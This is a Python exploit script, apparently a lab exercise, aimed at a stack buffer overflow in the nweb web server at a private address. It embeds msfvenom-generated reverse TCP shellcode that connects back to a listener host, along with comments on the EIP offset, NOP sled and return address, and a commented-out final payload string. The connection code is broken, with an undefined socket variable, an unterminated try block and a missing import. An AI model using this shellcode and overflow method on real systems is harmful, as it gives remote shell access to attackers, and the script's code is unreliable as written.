import sys
import socket

#shell code generated by using msfconsole
#LHOST=192.168.32.10
#LPORT=8998
#encoder used: x86/alpha_upper
#language(-f):python
buf =  b""
buf += b"\x89\xe3\xda\xdc\xd9\x73\xf4\x5e\x56\x59\x49\x49\x49"
buf += b"\x49\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33"
buf += b"\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41"
buf += b"\x30\x30\x41\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41"
buf += b"\x42\x32\x42\x42\x30\x42\x42\x58\x50\x38\x41\x43\x4a"
buf += b"\x4a\x49\x56\x51\x49\x4b\x5a\x57\x4a\x43\x36\x33\x57"
buf += b"\x33\x46\x33\x53\x5a\x54\x42\x4b\x39\x4d\x31\x48\x30"
buf += b"\x53\x56\x48\x4d\x4b\x30\x4c\x53\x30\x59\x58\x30\x47"
buf += b"\x4f\x58\x4d\x4d\x50\x51\x59\x44\x39\x4c\x39\x32\x48"
buf += b"\x39\x50\x59\x38\x51\x30\x55\x5a\x53\x58\x33\x32\x53"
buf += b"\x30\x31\x33\x56\x46\x4c\x49\x4b\x51\x48\x30\x43\x56"
buf += b"\x50\x50\x30\x51\x51\x43\x4f\x43\x45\x53\x4b\x39\x4b"
buf += b"\x51\x38\x4d\x4b\x30\x30\x52\x32\x48\x42\x4e\x36\x4f"
buf += b"\x33\x43\x43\x58\x33\x58\x36\x4f\x46\x4f\x35\x32\x52"
buf += b"\x49\x4b\x39\x4d\x33\x31\x42\x50\x53\x4c\x49\x4b\x51"
buf += b"\x58\x30\x34\x4b\x58\x4d\x4b\x30\x41\x41"

#This is the string that we will be using to overflow the buffer. 
#The offset to where EIP starts is at 1032
#The shell code is 205 bytes
#The starting of the string is filled with 827 NOPs 
#The middle of the string is filled with buf which contains the reverse_shell_TCP shell code
#The end of the string is filled with the address bfffbf00.
#The address is filled backwards as the architecture is little endian
#testing string
overflow_string = b"A"*1032 + b"B"*4
#overflow_string = b"0x90" * 827 + buf + b"\x00\xbf\xff\xbf" 


#Target ip address and port
#These variables will be used as parameters for http.client
#Make sure that the ip address for the target machine is the same as the ip_add below
#Start the nweb service using the port 8888
ip_add = '192.168.32.40'
nweb_port= 8888

try:
    #Start a connection using socket
    nweb_connect = socket.socket(AF_INET, socket.SOCK_STREAM)
    sock.connect((ip_add, nweb_port))

#Did not work
#After using http.client did not work, I am going to try to use socket
'''
while True:
    try:
        #Creating a HTTP connection
        nweb_connect = http.client.HTTPConnection(ip_add, nweb_port)
        #Reinitiliaze overflow string to send
        exploit = overflow_string
        #Send HTTP GET request
        nweb_connect.request("GET", "/", exploit)
        #Get response from server
        response = nweb_connect.getresponse()
        if response.status ==200:
            response_content = response.read().decode()
            print(response_content)
        else:
            print(f"Failed:{response.status}")
    except Exception as e:
        print(f"Failed connection: {e}")
        sys.exit()
'''


#Test to see if http.client can retrieve index
'''
nweb_connect.request("GET", "/index.html")
response = nweb_connect.getresponse()

if response.status == 200:
    html_content = response.read().decode()
    print(html_content)
else: 
    print("Failed")
    sys.exit()

nweb_connect.close()
'''
